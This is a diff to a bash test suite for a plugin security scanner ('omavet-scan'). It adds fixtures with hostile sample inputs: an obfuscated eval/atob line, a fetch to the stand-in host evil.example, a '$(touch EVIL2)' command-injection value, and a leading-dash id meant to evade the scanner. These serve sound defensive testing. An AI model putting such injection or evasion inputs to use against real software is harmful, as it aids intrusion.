@@ -4,6 +4,7 @@
 
 set -u
 cd "$(dirname "$0")/.." || exit 1
+SCAN="$(pwd)/bin/omavet-scan"
 
 TMP=$(mktemp -d) || exit 1
 trap 'rm -rf "$TMP"' EXIT
@@ -85,11 +86,12 @@ OMAVET_PLUGINS_DIR="$TMP/does-not-exist" OMAVET_STATE_DIR="$TMP/state3" bin/omav
 PASS=$((PASS + 1))
 
 # --- weird filenames (spaces, no manifest) -----------------------------------
+# the sanitized stem carries a short hash suffix (the id needed sanitizing)
 mkdir -p "$TMP/plugins/weird name plugin"
 printf 'eval(atob("x"))\n' >"$TMP/plugins/weird name plugin/a b.js"
 OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan || fail "weird-name scan exited non-zero"
-weird="$STATE/weird_name_plugin.json"
-[[ -f $weird ]] || fail "weird-name record missing"
+weird=$(ls "$STATE"/weird_name_plugin*.json 2>/dev/null | head -1)
+[[ -n $weird && -f $weird ]] || fail "weird-name record missing"
 assert_eq "$(jq -r .capabilities.obfuscation "$weird")" 1 "weird-name obfuscation"
 
 # --- stale record pruning ----------------------------------------------------
@@ -107,10 +109,10 @@ case "$out" in
 esac
 
 # --- git review baseline / unreviewed / accept flow --------------------------
-GIT="git -C $TMP/plugins/benign-clock -c user.email=t@t -c user.name=t"
-$GIT init -q
-$GIT add -A
-$GIT commit -qm init
+GIT() { git -C "$TMP/plugins/benign-clock" -c user.email=t@t -c user.name=t "$@"; }
+GIT init -q
+GIT add -A
+GIT commit -qm init
 OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan test.benign-clock || fail "git scan failed"
 assert_eq "$(jq -r .git.unreviewed "$benign")" "false" "fresh repo baselines as reviewed"
 
@@ -125,8 +127,8 @@ case "$out" in
 *) fail "--diff dirty output unexpected: $out" ;;
 esac
 
-$GIT add -A
-$GIT commit -qm update
+GIT add -A
+GIT commit -qm update
 OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan test.benign-clock || fail "post-commit scan failed"
 assert_eq "$(jq -r .git.unreviewed "$benign")" "true" "moved HEAD stays unreviewed"
 
@@ -143,8 +145,7 @@ JSON
 printf 'import QtQuick\nItem{}\n' >"$TMP/plugins/evil/W.qml"
 HSTATE="$TMP/hstate"
 ( cd "$TMP" && OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$HSTATE" \
-  "$OLDPWD/bin/omavet-scan" >/dev/null 2>&1 ) || true
-OLDPWD_KEEP=$(pwd)
+  "$SCAN" >/dev/null 2>&1 ) || fail "scan crashed on a hostile manifest id (\$TMP cwd)"
 OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$HSTATE" bin/omavet-scan >/dev/null 2>&1 \
   || fail "scan crashed on a hostile manifest id"
 # every state file must stay inside the state dir (record_name sanitized the id)
@@ -157,6 +158,54 @@ OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$HSTATE" \
   bin/omavet-scan --diff '$(touch EVIL2); x' >/dev/null 2>&1
 [[ ! -e ./EVIL2 && ! -e "$TMP/EVIL2" ]] || fail "--diff executed a hostile id"
 PASS=$((PASS + 1))
+
+# --- leading-dash manifest id: record must survive the scan+prune pass -------
+# An id like "-evil" turns the record stem into something every tool reads as
+# an option. The prune grep must not eat it (scanner evasion) and the stem
+# must never begin with '-' or '.'.
+mkdir -p "$TMP/plugins/dash-evil"
+cat >"$TMP/plugins/dash-evil/manifest.json" <<'JSON'
+{"schemaVersion":1,"id":"-evil","name":"dash","version":"1","kinds":["bar-widget"],"entryPoints":{"barWidget":"W.qml"}}
+JSON
+printf 'import QtQuick\nItem{}\n' >"$TMP/plugins/dash-evil/W.qml"
+OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan || fail "dash-id scan exited non-zero"
+dashrec=""
+for f in "$STATE"/*.json; do
+  [[ $(jq -r .id "$f") == "-evil" ]] && dashrec="$f"
+done
+[[ -n $dashrec ]] || fail "leading-dash id record missing after scan+prune"
+case "$(basename "$dashrec")" in
+-* | .*) fail "leading-dash id produced an option/hidden record name: $dashrec" ;;
+esac
+PASS=$((PASS + 2))
+
+# --- NUL byte in a source file: finding evidence must not vanish -------------
+# grep treats NUL-containing files as binary and hides match lines; the scan
+# must still report both the capability count AND the finding rows.
+mkdir -p "$TMP/plugins/nul-plugin"
+printf 'fetch("https://evil.example/x")\n\0\n' >"$TMP/plugins/nul-plugin/payload.js"
+OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan || fail "nul scan exited non-zero"
+nul="$STATE/nul-plugin.json"
+[[ -f $nul ]] || fail "nul-plugin record missing"
+jq -e '.capabilities.network >= 1' "$nul" >/dev/null || fail "NUL byte hid the network capability"
+jq -e '.findings | length >= 1' "$nul" >/dev/null || fail "NUL byte hid the finding rows"
+PASS=$((PASS + 2))
+
+# --- colliding ids: distinct ids sanitizing to one stem get distinct records --
+# "a/b" and "a b" both sanitize to "a_b"; neither may mask the other.
+mkdir -p "$TMP/plugins/col-one" "$TMP/plugins/col-two"
+cat >"$TMP/plugins/col-one/manifest.json" <<'JSON'
+{"schemaVersion":1,"id":"a/b","name":"one","version":"1","kinds":["bar-widget"],"entryPoints":{"barWidget":"W.qml"}}
+JSON
+cat >"$TMP/plugins/col-two/manifest.json" <<'JSON'
+{"schemaVersion":1,"id":"a b","name":"two","version":"1","kinds":["bar-widget"],"entryPoints":{"barWidget":"W.qml"}}
+JSON
+printf 'import QtQuick\nItem{}\n' >"$TMP/plugins/col-one/W.qml"
+printf 'import QtQuick\nItem{}\n' >"$TMP/plugins/col-two/W.qml"
+OMAVET_PLUGINS_DIR="$TMP/plugins" OMAVET_STATE_DIR="$STATE" bin/omavet-scan || fail "collision scan exited non-zero"
+jq -r .id "$STATE"/a_b*.json 2>/dev/null | grep -qxF -e 'a/b' || fail "record for id 'a/b' masked by collision"
+jq -r .id "$STATE"/a_b*.json 2>/dev/null | grep -qxF -e 'a b' || fail "record for id 'a b' masked by collision"
+PASS=$((PASS + 2))
 
 echo "OK: $PASS assertions passed"
 exit 0
